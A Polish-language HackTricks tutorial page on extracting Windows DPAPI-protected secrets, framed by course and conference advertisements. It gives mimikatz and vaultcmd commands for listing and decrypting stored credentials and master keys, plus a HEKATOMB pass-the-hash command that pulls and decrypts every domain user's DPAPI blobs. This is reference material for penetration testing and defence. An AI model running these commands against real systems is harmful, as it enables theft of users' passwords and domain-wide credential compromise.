# DPAPI - Wydobywanie haseł

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Czy pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana na HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakowania, przesyłając PR-y do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie z zakresu cyberbezpieczeństwa w **Hiszpanii** i jedno z najważniejszych w **Europie**. Mając **misję promowania wiedzy technicznej**, ten kongres stanowi gorące miejsce spotkań dla profesjonalistów technologii i cyberbezpieczeństwa we wszystkich dziedzinach.

{% embed url="https://www.rootedcon.com/" %}

## Co to jest DPAPI

Interfejs programistyczny ochrony danych (DPAPI) jest głównie wykorzystywany w systemie operacyjnym Windows do **symetrycznego szyfrowania asymetrycznych kluczy prywatnych**, wykorzystując tajemnice użytkownika lub systemu jako znaczące źródło entropii. Ten podejście upraszcza szyfrowanie dla programistów, umożliwiając im szyfrowanie danych za pomocą klucza pochodzącego z tajemnic logowania użytkownika lub, w przypadku szyfrowania systemowego, tajemnic uwierzytelniania domeny systemu, eliminując konieczność zarządzania ochroną klucza szyfrowania przez programistów.

### Dane chronione przez DPAPI

Wśród danych osobistych chronionych przez DPAPI znajdują się:

* Hasła i dane autouzupełniania Internet Explorera i Google Chrome'a
* Hasła do kont e-mailowych i wewnętrznych kont FTP dla aplikacji takich jak Outlook i Windows Mail
* Hasła do współdzielonych folderów, zasobów, sieci bezprzewodowych i Skarbca systemu Windows, w tym klucze szyfrowania
* Hasła do połączeń pulpitu zdalnego, paszportu .NET oraz klucze prywatne do różnych celów szyfrowania i uwierzytelniania
* Hasła do sieci zarządzane przez Menedżera poświadczeń oraz dane osobiste w aplikacjach korzystających z CryptProtectData, takich jak Skype, MSN Messenger i inne

## Lista Skarbca
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Pliki uwierzytelniające

**Chronione pliki uwierzytelniające** mogą znajdować się w:
```
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Uzyskaj informacje o poświadczeniach, używając mimikatz `dpapi::cred`, w odpowiedzi można znaleźć interesujące informacje, takie jak zaszyfrowane dane i guidMasterKey.
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
Możesz użyć **modułu mimikatz** `dpapi::cred` z odpowiednim parametrem `/masterkey` do odszyfrowania:
```
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
```
## Klucze główne

Klucze DPAPI używane do szyfrowania kluczy RSA użytkownika są przechowywane w katalogu `%APPDATA%\Microsoft\Protect\{SID}`, gdzie {SID} to [**identyfikator zabezpieczeń**](https://pl.wikipedia.org/wiki/Security\_Identifier) **tego użytkownika**. **Klucz DPAPI jest przechowywany w tym samym pliku co klucz główny chroniący prywatne klucze użytkownika**. Zazwyczaj ma 64 bajty losowych danych. (Zauważ, że ten katalog jest chroniony, więc nie można go wyświetlić używając `dir` z cmd, ale można go wyświetlić z PS).
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
To jest to, jak będzie wyglądać wiele kluczy głównych użytkownika:

![](<../../.gitbook/assets/image (1118).png>)

Zazwyczaj **każdy klucz główny to zaszyfrowany klucz symetryczny, który może odszyfrować inne treści**. Dlatego **wydobycie** **zaszyfrowanego klucza głównego** jest interesujące, aby później **odszyfrować** inne treści z nim **zaszyfrowane**.

### Wydobycie klucza głównego i odszyfrowanie

Sprawdź post [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#extracting-dpapi-backup-keys-with-domain-admin) dla przykładu, jak wydobyć klucz główny i go odszyfrować.

## SharpDPAPI

[SharpDPAPI](https://github.com/GhostPack/SharpDPAPI#sharpdpapi-1) to port C# pewnych funkcji DPAPI z projektu [@gentilkiwi](https://twitter.com/gentilkiwi) [Mimikatz](https://github.com/gentilkiwi/mimikatz/).

## HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) to narzędzie, które automatyzuje wydobycie wszystkich użytkowników i komputerów z katalogu LDAP oraz wydobycie klucza zapasowego kontrolera domeny za pomocą RPC. Skrypt rozwiąże adresy IP wszystkich komputerów i wykona smbclient na wszystkich komputerach, aby pobrać wszystkie bloki DPAPI wszystkich użytkowników i odszyfrować wszystko za pomocą klucza zapasowego domeny.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Dzięki wydobytym z listy komputerów LDAP możesz znaleźć każdą podsieć, nawet jeśli ich nie znałeś!

"Ponieważ prawa administratora domeny to za mało. Wszystkich ich zhackuj."

## DonPAPI

[**DonPAPI**](https://github.com/login-securite/DonPAPI) może automatycznie wydobywać zabezpieczone DPAPI tajemnice.

## Referencje

* [https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13](https://www.passcape.com/index.php?section=docsys\&cmd=details\&id=28#13)
* [https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) to najważniejsze wydarzenie związane z cyberbezpieczeństwem w **Hiszpanii** i jedno z najważniejszych w **Europie**. Mając **misję promowania wiedzy technicznej**, ten kongres jest gorącym punktem spotkań dla profesjonalistów technologii i cyberbezpieczeństwa we wszystkich dziedzinach.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Pracujesz w **firmie cyberbezpieczeństwa**? Chcesz zobaczyć, jak Twoja **firma jest reklamowana w HackTricks**? lub chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
